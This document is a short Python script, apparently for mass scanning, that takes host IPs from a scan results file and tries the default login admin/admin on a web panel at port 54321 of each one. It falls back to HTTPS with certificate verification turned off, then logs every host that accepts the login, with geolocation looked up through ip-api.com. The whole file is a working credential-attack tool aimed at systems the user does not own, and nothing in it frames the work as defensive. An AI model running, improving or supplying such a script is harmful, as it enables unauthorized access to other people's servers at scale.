import requests

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country = ip_info.get('country', 'N/A')
            region = ip_info.get('regionName', 'N/A')
            city = ip_info.get('city', 'N/A')
            isp = ip_info.get('isp', 'N/A')
            return f"{country}, {region}, {city}, ISP: {isp}"
    except requests.exceptions.RequestException:
        pass
    return 'N/A'

with open("results.txt", "r") as file:
    for line in file:
        # 提取IP地址
        parts = line.split("Host: ")
        if len(parts) < 2:
            print("Invalid line format:", line)
            continue
        ip = parts[1].split(" ")[0]
        url = "http://" + ip + ":54321/login"

        try:
            # 尝试使用 HTTP 进行请求
            r = requests.post(url, data=data, timeout=2)
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        ip_info = get_ip_info(ip)
                        print(ip + ' Successful (' + ip_info + ')')
                        with open("result.txt", "a") as result:
                            result.write(ip + ' (' + ip_info + ')\n')
                    else:
                        print(ip + ' Def')
                except ValueError:
                    print("Invalid JSON response from:", url)
            else:
                print(ip + ' Def')
        except requests.exceptions.RequestException:
            try:
                # 使用 HTTPS 进行请求，跳过证书验证
                url = "https://" + ip + ":54321/login"
                r = requests.post(url, data=data, timeout=2, verify=False)
                if r.status_code == 200:
                    try:
                        response_data = r.json()
                        if isinstance(response_data, dict) and response_data.get("success"):
                            ip_info = get_ip_info(ip)
                            print(ip + ' Successful (' + ip_info + ')')
                            with open("result.txt", "a") as result:
                                result.write(ip + ' (' + ip_info + ')\n')
                        else:
                            print(ip + ' Def')
                    except ValueError:
                        print("Invalid JSON response from:", url)
                else:
                    print(ip + ' Def')
            except requests.exceptions.RequestException:
                print(ip + ' Def')
